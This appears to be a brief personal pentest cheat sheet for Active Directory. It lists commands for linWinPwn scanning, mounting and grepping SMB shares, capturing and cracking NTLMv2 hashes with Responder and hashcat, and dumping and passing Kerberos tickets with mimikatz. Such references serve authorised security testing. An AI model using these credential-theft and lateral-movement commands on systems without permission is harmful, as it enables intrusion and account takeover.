# Gunnajs-Playbook
How pentest like a Gunnaj

## Tools bby

### linWinPwn - Active Directory Vulnerability Scanner
https://github.com/lefayjey/linWinPwn
### mimikatz
https://github.com/ParrotSec/mimikatz
### Responder
https://github.com/lgandx/Responder
# VEV

## linWinPwn 
```bash
sudo ./linWinPwn.sh -t <Domän_Kontrollant_IP> -u <AD_konto> -p <AD_lösen>
```
## SMB VEV
### Mount share
```bash
sudo mount.cifs <//ip/folder> <./mapp> -o user=<username>,password=<password>,dom=<domain.com>
```
### Unmount share
```bash
sudo umount.cifs <./mapp>
```
### Search for keywords in files
```bash
grep -i <keyword> *
```
## Nmap
* in the making 

## Zero Logon
* in the making 
## Responder
### Kickstart responder
```bash
responder -I eth0 -v
```
### Crack NTLMv2 hashes
```bash
hashcat64.exe -m 5600 ntlm-hashes.txt <passlist.txt> -o cracked.txt
```

## Mimikatz
### Dump tickets
```bash
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```
### Pass the ticket
```bash
mimikatz.exe
kerberos::ptt <ticket>
klist
```
